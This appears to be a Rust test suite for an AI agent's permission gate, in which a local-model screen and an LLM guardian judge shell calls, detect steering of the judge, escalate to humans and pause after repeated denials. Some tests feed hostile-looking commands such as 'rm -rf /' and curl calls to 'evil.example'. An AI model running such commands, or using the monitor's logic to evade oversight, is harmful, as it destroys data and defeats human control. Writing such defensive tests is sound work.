//! The `screen` preset in `auto`: it can stop a call as an escalation and, only through the
//! steering-hardened allow path, allow one. Every call it does not settle reaches the guardian.
//! The tests that cut a pending guardian short race the screen against it (`concurrent`); the
//! shadow tests run the default sequential shape.

mod common;

use std::sync::Arc;
use std::sync::atomic::Ordering;
use std::time::Duration;

use common::pipeline::{
    Delayed, Options, Rig, allow_verdict, allowed, delayed_guardian, denied_message, fake_guardian,
    verdict_json,
};
use fontaine_agents::mode::Ladder;
use fontaine_core::audit::Decision;
use fontaine_core::config::PermissionMode::Auto;
use fontaine_core::gate::CompositionStage;
use fontaine_core::permissions::Answer;
use fontaine_core::tier::Tier;
use fontaine_guardian::composition::{Composition, CompositionSpec, Param, Script};
use fontaine_guardian::{Guardian, Profile, Reader, ReaderSettings};
use fontaine_tools::gate::ROOT_AGENT;
use serde_json::{Value, json};
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, Request, ResponseTemplate};

fn shell(command: &str) -> Value {
    json!({"command": command})
}

fn logprobs(yes: f64, no: f64) -> Value {
    let top = json!([
        {"token": "Yes", "logprob": yes.ln()},
        {"token": "No", "logprob": no.ln()},
    ]);
    json!({"message": {"content": "Yes"}, "logprobs": [{"token": "Yes", "logprob": yes.ln(), "top_logprobs": top}]})
}

async fn ollama(response: ResponseTemplate) -> MockServer {
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/api/chat"))
        .respond_with(response)
        .mount(&server)
        .await;
    server
}

/// A model that finds the call outside the request with `risk`.
async fn risky(risk: f64) -> MockServer {
    ollama(ResponseTemplate::new(200).set_body_json(logprobs(1.0 - risk, risk))).await
}

const MODEL: &str = "local/qwen3:4b";

/// Races the screen against the guardian unless it is in shadow mode, which records what the
/// screen alone would have done.
fn stage(server: &MockServer, shadow: bool) -> CompositionStage {
    stage_with(server, shadow, &[("stop_threshold", Param::Number(0.9))])
}

fn allowing_stage(server: &MockServer, shadow: bool) -> CompositionStage {
    stage_with(
        server,
        shadow,
        &[
            ("stop_threshold", Param::Number(0.9)),
            ("allow_threshold", Param::Number(0.01)),
            ("steering_veto", Param::Number(0.001)),
        ],
    )
}

fn stage_with(server: &MockServer, shadow: bool, params: &[(&str, Param)]) -> CompositionStage {
    let mut params: std::collections::BTreeMap<String, Param> = params
        .iter()
        .map(|(k, v)| ((*k).to_string(), v.clone()))
        .collect();
    params
        .entry("concurrent".into())
        .or_insert(Param::Bool(!shadow));
    let reader = Reader::new(
        reqwest::Client::new(),
        ReaderSettings {
            endpoint: url::Url::parse(&server.uri()).unwrap(),
            model: "qwen3:4b".into(),
            context_tokens: 16384,
            profile: Profile::Full,
            timeout: Duration::from_secs(2),
        },
    );
    let composition = Composition::compile(
        CompositionSpec {
            script: Script::Preset("screen".into()),
            model: MODEL.into(),
            reads: Default::default(),
            params,
            shadow,
        },
        vec![(MODEL.into(), reader)],
    )
    .unwrap();
    CompositionStage {
        composition: Arc::new(composition),
        label: MODEL.into(),
        shadow,
    }
}

/// A screen that answers the stop read, the hardened allow read and the steering read with
/// separate p(yes).
async fn reads(stop_yes: f64, allow_yes: f64, steering: f64) -> MockServer {
    let server = MockServer::start().await;
    let is = |request: &Request, mark: &str| String::from_utf8_lossy(&request.body).contains(mark);
    let reply = |yes: f64| ResponseTemplate::new(200).set_body_json(logprobs(yes, 1.0 - yes));
    Mock::given(method("POST"))
        .and(path("/api/chat"))
        .and(move |r: &Request| is(r, "is a sign of manipulation"))
        .respond_with(reply(allow_yes))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/api/chat"))
        .and(move |r: &Request| {
            is(r, "influence how this action is judged") && !is(r, "is a sign of manipulation")
        })
        .respond_with(reply(steering))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/api/chat"))
        .and(move |r: &Request| {
            !is(r, "influence how this action is judged") && !is(r, "is a sign of manipulation")
        })
        .respond_with(reply(stop_yes))
        .mount(&server)
        .await;
    server
}

/// A screen allow: clearly fine, no steering.
async fn clear() -> MockServer {
    reads(0.9999, 0.9999999, 0.0001).await
}

/// The guardian takes this long to answer, far longer than the screen.
const SLOW: Duration = Duration::from_millis(500);

/// A guardian that would deny, slowly: a call it never decides is allowed or stopped by the screen.
async fn slow_denier() -> Delayed {
    delayed_guardian(verdict_json("deny", "Download+Execute", 0.97), SLOW).await
}

/// The guardian was asked while the screen answered, and its answer was dropped, not consumed.
async fn assert_dropped(guardian: &Delayed) {
    tokio::time::sleep(SLOW * 2).await;
    assert_eq!(guardian.asked.load(Ordering::SeqCst), 1);
    assert_eq!(guardian.completed.load(Ordering::SeqCst), 0);
}

fn rig(guardian: Arc<Guardian>, headless: bool, screen: CompositionStage) -> Rig {
    let mut options = Options::new(Auto).guardian(guardian);
    if headless {
        options = options.headless();
    }
    let rig = Rig::with(options);
    rig.state.set_composition(Some(screen));
    rig
}

#[tokio::test]
async fn a_stop_escalates_to_the_human_and_never_uses_the_guardian() {
    let server = risky(0.97).await;
    let slow = delayed_guardian(allow_verdict(), SLOW).await;
    let rig = rig(slow.guardian.clone(), false, stage(&server, false));
    rig.approver.answer(Answer::Deny { feedback: None });
    let decision = rig.check("shell", shell("python a.py")).await;
    assert!(!allowed(&decision));
    assert_dropped(&slow).await;
    let request = rig.approver.last_request();
    assert_eq!(request.tier, Tier::Screen);
    assert!(
        request
            .reason
            .contains("the guardian composition stopped this call at screen.stop: risk 0.97")
    );
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Screen, Decision::Prompt)
    );
    assert_eq!(record.screen_outcome.as_deref(), Some("stop"));
    assert_eq!(record.screen_model.as_deref(), Some("local/qwen3:4b"));
    assert!((record.screen_risk.unwrap() - 0.97).abs() < 1e-9);
    assert!(record.screen_latency_ms.is_some());
    assert!(record.guardian_dropped_input_tokens.is_some_and(|n| n > 0));
    assert!(record.guardian_dropped_provider.is_some());
    assert!(record.guardian_dropped_model.is_some());
    assert_eq!(record.guardian_dropped_priced, Some(true));
    assert!(!rig.state.auto_paused());
}

#[tokio::test]
async fn the_human_can_still_approve_a_stopped_call() {
    let server = risky(0.97).await;
    let slow = delayed_guardian(allow_verdict(), SLOW).await;
    let rig = rig(slow.guardian.clone(), false, stage(&server, false));
    rig.approver.answer(Answer::AllowOnce);
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert_dropped(&slow).await;
    let tiers: Vec<_> = rig.audit().iter().map(|r| r.tier).collect();
    assert_eq!(tiers, [Tier::Screen, Tier::Human]);
}

#[tokio::test]
async fn a_headless_stop_is_a_denial_that_names_the_screen() {
    let server = risky(0.97).await;
    let slow = delayed_guardian(allow_verdict(), SLOW).await;
    let rig = rig(slow.guardian.clone(), true, stage(&server, false));
    let decision = rig.check("shell", shell("python a.py")).await;
    let message = denied_message(&decision);
    assert!(message.contains("the guardian composition stopped this call at screen.stop"));
    assert!(message.contains("headless"));
    assert_dropped(&slow).await;
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Screen, Decision::Deny)
    );
}

struct Witness(Arc<std::sync::Mutex<Vec<(Tier, String)>>>);

impl fontaine_core::permissions::PermissionDeniedHook for Witness {
    fn id(&self) -> String {
        "witness".into()
    }

    fn run<'a>(
        &'a self,
        event: fontaine_core::permissions::PermissionDeniedEvent<'a>,
    ) -> futures::future::BoxFuture<'a, Result<bool, fontaine_core::permissions::HookError>> {
        self.0
            .lock()
            .unwrap()
            .push((event.tier, event.reason.to_string()));
        Box::pin(async { Ok(false) })
    }
}

#[tokio::test]
async fn a_headless_stop_runs_permission_denied_hooks() {
    let server = risky(0.97).await;
    let slow = delayed_guardian(allow_verdict(), SLOW).await;
    let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
    let mut options = Options::new(Auto)
        .guardian(slow.guardian.clone())
        .headless();
    options.denied_hooks = vec![Arc::new(Witness(seen.clone()))];
    let rig = Rig::with(options);
    rig.state.set_composition(Some(stage(&server, false)));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    let seen = seen.lock().unwrap();
    assert_eq!(seen.len(), 1);
    assert_eq!(seen[0].0, Tier::Screen);
    assert!(seen[0].1.contains("the guardian composition stopped"));
}

#[tokio::test]
async fn a_pass_reaches_the_guardian_and_the_guardian_decides() {
    let server = risky(0.1).await;
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = rig(fake.guardian.clone(), false, stage(&server, false));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Guardian, Decision::Deny)
    );
    assert_eq!(record.screen_outcome.as_deref(), Some("pass"));
    assert!(record.screen_risk.unwrap() < 0.2);
}

#[tokio::test]
async fn a_pass_never_allows_by_itself() {
    // The screen is as sure as it can be that the call is fine; the guardian still has the say.
    let server = risky(0.0001).await;
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = rig(fake.guardian.clone(), false, stage(&server, false));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn an_unavailable_screen_warns_once_and_the_guardian_decides() {
    let server = ollama(ResponseTemplate::new(500)).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(fake.guardian.clone(), false, stage(&server, false));
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert!(allowed(&rig.check("shell", shell("python b.py")).await));
    assert_eq!(fake.calls(), 2);
    let warnings = rig.approver.warnings.lock().unwrap().clone();
    assert_eq!(warnings.len(), 1, "{warnings:?}");
    assert!(warnings[0].contains("local/qwen3:4b"));
    let record = &rig.audit()[0];
    assert_eq!(record.tier, Tier::Guardian);
    assert_eq!(record.screen_outcome.as_deref(), Some("unavailable"));
    assert_eq!(record.screen_risk, None);
}

#[tokio::test]
async fn shadow_mode_records_the_score_and_never_changes_the_decision() {
    let server = risky(0.99).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(fake.guardian.clone(), false, stage(&server, true));
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
    assert_eq!(rig.approver.asked(), 0);
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Guardian, Decision::Allow)
    );
    assert_eq!(record.screen_outcome.as_deref(), Some("stop"));
    assert!((record.screen_risk.unwrap() - 0.99).abs() < 1e-9);
    assert_eq!(record.guardian_dropped_input_tokens, None);
}

#[tokio::test]
async fn the_screen_never_sees_a_call_the_floor_or_the_fast_path_settled() {
    let server = risky(0.99).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(fake.guardian.clone(), false, stage(&server, false));
    // A tier-05 command and a critical path: neither is the guardian's to judge.
    assert!(allowed(&rig.check("shell", shell("ls")).await));
    rig.approver.answer(Answer::Deny { feedback: None });
    rig.check("shell", shell("rm -rf /")).await;
    assert_eq!(server.received_requests().await.unwrap().len(), 0);
    assert_eq!(rig.audit()[1].tier, Tier::CriticalPath);
}

#[tokio::test]
async fn a_subagent_call_meets_the_same_screen() {
    let server = risky(0.97).await;
    let slow = delayed_guardian(allow_verdict(), SLOW).await;
    let rig = rig(slow.guardian.clone(), true, stage(&server, false));
    let child = rig
        .agents
        .reserve(ROOT_AGENT, "worker", "m", Vec::new(), Ladder::Auto)
        .unwrap();
    let decision = rig.check_as(&child, "shell", shell("python a.py")).await;
    assert!(!allowed(&decision));
    assert_dropped(&slow).await;
    let record = &rig.audit()[0];
    assert_eq!(
        (record.agent_id.as_str(), record.tier),
        (child.as_str(), Tier::Screen)
    );
}

#[tokio::test]
async fn a_screen_allow_runs_the_call_without_the_guardians_verdict() {
    let server = clear().await;
    let slow = slow_denier().await;
    let rig = rig(slow.guardian.clone(), false, allowing_stage(&server, false));
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(rig.approver.asked(), 0);
    assert_dropped(&slow).await;
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Screen, Decision::Allow)
    );
    assert_eq!(record.rule.as_deref(), Some("screen.allow"));
    assert_eq!(record.screen_outcome.as_deref(), Some("allow"));
    assert_eq!(record.screen_model.as_deref(), Some("local/qwen3:4b"));
    assert!(record.screen_allow_risk.unwrap() < 0.01);
    assert!(record.screen_steering.unwrap() < 0.001);
    assert_eq!(record.guardian_verdict, None);
    assert!(record.guardian_dropped_input_tokens.is_some_and(|n| n > 0));
    assert!(
        record
            .explanation
            .as_deref()
            .unwrap()
            .contains("the guardian composition allowed this call at screen.allow")
    );
    let ledger: Vec<_> = rig
        .session
        .ledger
        .read()
        .unwrap()
        .into_iter()
        .map(|e| e.record)
        .collect();
    assert!(ledger.iter().any(
        |r| matches!(r, fontaine_core::ledger::Record::Action { tool, .. } if tool == "shell")
    ));
}

#[tokio::test]
async fn a_screen_allow_of_an_external_read_returns_the_resolved_target() {
    let server = clear().await;
    let slow = slow_denier().await;
    let rig = rig(slow.guardian.clone(), false, allowing_stage(&server, false));
    let outside = rig.world.root.join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    std::fs::write(outside.join("x.txt"), "x").unwrap();
    match rig.check("read", json!({"path": "../outside/x.txt"})).await {
        fontaine_tools::gate::GateDecision::Allow { args } => {
            assert_eq!(
                args,
                json!({"path": outside.join("x.txt").to_str().unwrap()}),
                "the screen's allow carries the resolved target"
            );
        }
        other => panic!("{other:?}"),
    }
    assert_dropped(&slow).await;
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Screen, Decision::Allow)
    );
}

#[tokio::test]
async fn steering_in_the_arguments_sends_the_call_to_the_guardian() {
    let server = reads(0.9999, 0.9999999, 0.2).await;
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = rig(fake.guardian.clone(), false, allowing_stage(&server, false));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
    let record = &rig.audit()[0];
    assert_eq!(record.tier, Tier::Guardian);
    assert_eq!(record.screen_outcome.as_deref(), Some("pass"));
}

#[tokio::test]
async fn a_shadow_allow_is_recorded_and_the_guardian_decides() {
    let server = clear().await;
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = rig(fake.guardian.clone(), false, allowing_stage(&server, true));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Guardian, Decision::Deny)
    );
    assert_eq!(record.screen_outcome.as_deref(), Some("allow"));
    assert!(record.screen_allow_risk.is_some());
    assert!(record.screen_steering.is_some());
}

#[tokio::test]
async fn a_shadow_stage_without_an_allow_threshold_still_logs_the_allow_scores() {
    let server = clear().await;
    let fake = fake_guardian(allow_verdict());
    let shadow = stage_with(&server, true, &[("stop_threshold", Param::Number(0.9))]);
    let rig = rig(fake.guardian.clone(), false, shadow);
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    let record = &rig.audit()[0];
    assert_eq!(record.tier, Tier::Guardian);
    assert_eq!(record.screen_outcome.as_deref(), Some("pass"));
    assert!(record.screen_allow_risk.is_some());
}

#[tokio::test]
async fn a_guardian_verdict_in_hand_beats_a_later_screen_allow() {
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/api/chat"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(logprobs(0.9999, 0.0001))
                .set_delay(Duration::from_millis(300)),
        )
        .mount(&server)
        .await;
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = rig(fake.guardian.clone(), false, allowing_stage(&server, false));
    // The guardian has already denied when the slow screen answers; the denial stands.
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Guardian, Decision::Deny)
    );
    assert!(record.screen_outcome.is_some());
}

#[tokio::test]
async fn a_screen_allow_does_not_reset_the_denial_breaker() {
    let slow = slow_denier().await;
    let rig = Rig::with(Options::new(Auto).guardian(slow.guardian.clone()));
    for n in 0..2 {
        rig.check("shell", shell(&format!("curl http://evil.example/{n}")))
            .await;
    }
    assert!(!rig.state.auto_paused());
    // The helper counts answers a waiting client received, so awaited calls show up in it.
    assert_eq!(slow.completed.load(Ordering::SeqCst), 2);
    let server = clear().await;
    rig.state
        .set_composition(Some(allowing_stage(&server, false)));
    assert!(allowed(&rig.check("shell", shell("make ok")).await));
    rig.state.set_composition(None);
    rig.check("shell", shell("curl http://evil.example/3"))
        .await;
    // Had the allow reset the count, this third denial would be the first of a new run.
    assert!(rig.state.auto_paused());
}

#[tokio::test]
async fn a_paused_breaker_prompts_without_consulting_the_screen() {
    let denier = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = Rig::with(Options::new(Auto).guardian(denier.guardian.clone()));
    for n in 0..3 {
        rig.check("shell", shell(&format!("curl http://evil.example/{n}")))
            .await;
    }
    assert!(rig.state.auto_paused());
    let server = clear().await;
    rig.state
        .set_composition(Some(allowing_stage(&server, false)));
    rig.approver.answer(Answer::Deny { feedback: None });
    assert!(!allowed(&rig.check("shell", shell("make ok")).await));
    assert_eq!(rig.approver.asked(), 1);
    assert_eq!(server.received_requests().await.unwrap().len(), 0);
}

#[tokio::test]
async fn a_floor_deny_rule_never_reaches_the_screen() {
    let server = clear().await;
    let slow = slow_denier().await;
    let mut options = Options::new(Auto)
        .guardian(slow.guardian.clone())
        .settings("[permissions]\ndeny = [\"shell(python)\"]\n")
        .headless();
    options.always_allow_file = false;
    let rig = Rig::with(options);
    rig.state
        .set_composition(Some(allowing_stage(&server, false)));
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(server.received_requests().await.unwrap().len(), 0);
    assert_eq!(slow.asked.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn a_subagent_inherits_the_allow_path() {
    let server = clear().await;
    let slow = slow_denier().await;
    let rig = rig(slow.guardian.clone(), true, allowing_stage(&server, false));
    let child = rig
        .agents
        .reserve(ROOT_AGENT, "worker", "m", Vec::new(), Ladder::Auto)
        .unwrap();
    assert!(allowed(
        &rig.check_as(&child, "shell", shell("python a.py")).await
    ));
    let record = &rig.audit()[0];
    assert_eq!(
        (record.agent_id.as_str(), record.tier, record.decision),
        (child.as_str(), Tier::Screen, Decision::Allow)
    );
}

#[tokio::test]
async fn a_screen_that_cannot_answer_leaves_the_allow_path_to_the_guardian() {
    let server = ollama(ResponseTemplate::new(500)).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(fake.guardian.clone(), false, allowing_stage(&server, false));
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(fake.calls(), 1);
    let record = &rig.audit()[0];
    assert_eq!(record.tier, Tier::Guardian);
    assert_eq!(record.screen_outcome.as_deref(), Some("unavailable"));
}

#[tokio::test]
async fn a_server_marked_tool_never_reaches_the_screen_or_the_guardian() {
    let server = clear().await;
    let slow = slow_denier().await;
    let mut options = Options::new(Auto)
        .guardian(slow.guardian.clone())
        .headless();
    options.always_allow_file = false;
    let rig = Rig::with(options);
    rig.state
        .set_composition(Some(allowing_stage(&server, false)));
    assert!(!allowed(
        &rig.check_marked("mcp__srv__grant", json!({})).await
    ));
    assert_eq!(rig.audit()[0].tier, Tier::AskRule);
    assert_eq!(server.received_requests().await.unwrap().len(), 0);
    assert_eq!(slow.asked.load(Ordering::SeqCst), 0);
}

// ---------------------------------------------------------------- scripted compositions

/// A composition from a Rune script that declares the reads `a` (plain) and `h` (hardened).
fn script_stage(server: &MockServer, source: &str, shadow: bool) -> CompositionStage {
    use fontaine_guardian::{Prompt, Question, Read};
    let reader = Reader::new(
        reqwest::Client::new(),
        ReaderSettings {
            endpoint: url::Url::parse(&server.uri()).unwrap(),
            model: "qwen3:4b".into(),
            context_tokens: 16384,
            profile: Profile::Full,
            timeout: Duration::from_secs(2),
        },
    );
    let read = |prompt, question| Read {
        model: MODEL.into(),
        prompt,
        question,
    };
    let composition = Composition::compile(
        CompositionSpec {
            script: Script::Source(source.into()),
            model: MODEL.into(),
            reads: [
                (
                    "a".to_string(),
                    read(Prompt::Plain, Question::EmployeeAllowed),
                ),
                (
                    "h".to_string(),
                    read(Prompt::Hardened, Question::EmployeeAllowed),
                ),
                (
                    "extra".to_string(),
                    read(Prompt::Plain, Question::OutsideRequest),
                ),
            ]
            .into(),
            params: Default::default(),
            shadow,
        },
        vec![(MODEL.into(), reader)],
    )
    .unwrap();
    CompositionStage {
        composition: Arc::new(composition),
        label: MODEL.into(),
        shadow,
    }
}

#[tokio::test]
async fn a_script_deny_is_a_screen_tier_denial_that_never_prompts() {
    let server = risky(0.5).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(
        fake.guardian.clone(),
        false,
        script_stage(
            &server,
            r#"pub async fn guardian(call, params) { read(call, "a").await; deny("mine.node", "not today") }"#,
            false,
        ),
    );
    let decision = rig.check("shell", shell("python a.py")).await;
    assert!(denied_message(&decision).contains("mine.node"));
    assert_eq!(rig.approver.asked(), 0);
    assert_eq!(fake.calls(), 0);
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Screen, Decision::Deny)
    );
    assert_eq!(record.rule.as_deref(), Some("mine.node"));
    assert_eq!(record.fail_closed_reason, None);
    assert_eq!(record.screen_outcome.as_deref(), Some("deny"));
    // A deliberate deny is not a guardian denial: nothing to approve later, no breaker count.
    assert!(rig.state.denied_calls().is_empty());
}

#[tokio::test]
async fn a_failed_composition_is_a_guardian_denial_that_can_be_approved_later() {
    let server = risky(0.5).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(
        fake.guardian.clone(),
        false,
        script_stage(
            &server,
            "pub async fn guardian(call, params) { let x = 1 / 0; abstain() }",
            false,
        ),
    );
    for n in 0..3 {
        let decision = rig.check("shell", shell(&format!("make {n}"))).await;
        assert!(!allowed(&decision));
    }
    assert_eq!(rig.approver.asked(), 0);
    let record = &rig.audit()[0];
    assert_eq!(
        (record.tier, record.decision),
        (Tier::Guardian, Decision::Deny)
    );
    assert_eq!(record.fail_closed_reason.as_deref(), Some("error"));
    assert_eq!(record.screen_outcome.as_deref(), Some("unavailable"));
    assert_eq!(rig.state.denied_calls().len(), 3);
    // Three denials in a row pause auto mode, as guardian denials do.
    assert!(rig.state.auto_paused());
    let warnings = rig.approver.warnings.lock().unwrap().clone();
    assert_eq!(warnings.len(), 1, "{warnings:?}");
}

#[tokio::test]
async fn the_audit_record_carries_every_named_read() {
    let server = risky(0.1).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(
        fake.guardian.clone(),
        false,
        script_stage(
            &server,
            r#"pub async fn guardian(call, params) {
                std::future::join((read(call, "a"), read(call, "extra"))).await;
                llm(call).await
            }"#,
            false,
        ),
    );
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    let record = &rig.audit()[0];
    assert_eq!(record.screen_outcome.as_deref(), Some("pass"));
    let scores = record.screen_scores.as_ref().expect("the extra read");
    assert_eq!(scores.keys().collect::<Vec<_>>(), ["a", "extra"]);
    assert_eq!(record.screen_model.as_deref(), Some("local/qwen3:4b"));
}

#[tokio::test]
async fn the_default_screen_is_sequential_and_a_script_escalate_beats_a_guardian_allow() {
    // A composition that asks the guardian first and then escalates: the stricter outcome wins.
    let server = risky(0.1).await;
    let fake = fake_guardian(allow_verdict());
    let rig = rig(
        fake.guardian.clone(),
        false,
        script_stage(
            &server,
            r#"pub async fn guardian(call, params) { llm(call).await; escalate("late", "second look") }"#,
            false,
        ),
    );
    rig.approver.answer(Answer::Deny { feedback: None });
    assert!(!allowed(&rig.check("shell", shell("python a.py")).await));
    let request = rig.approver.last_request();
    assert_eq!(request.tier, Tier::Screen);
    assert!(request.reason.contains("late"));
    assert_eq!(fake.calls(), 1);
}

#[tokio::test]
async fn by_default_only_the_screens_allow_skips_the_guardian() {
    let server = clear().await;
    let denier = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let sequential = stage_with(
        &server,
        false,
        &[
            ("allow_threshold", Param::Number(0.01)),
            ("concurrent", Param::Bool(false)),
        ],
    );
    let rig = rig(denier.guardian.clone(), false, sequential);
    assert!(allowed(&rig.check("shell", shell("python a.py")).await));
    assert_eq!(denier.calls(), 0);

    // What the screen does not allow goes to the guardian, even a call it finds risky.
    let server = risky(0.99).await;
    let sequential = stage_with(
        &server,
        false,
        &[
            ("allow_threshold", Param::Number(0.01)),
            ("concurrent", Param::Bool(false)),
        ],
    );
    let rig = self::rig(denier.guardian.clone(), false, sequential);
    assert!(!allowed(&rig.check("shell", shell("python b.py")).await));
    assert_eq!(denier.calls(), 1);
    let record = &rig.audit()[0];
    assert_eq!(record.tier, Tier::Guardian);
    assert!(record.screen_risk.unwrap() > 0.9);
}
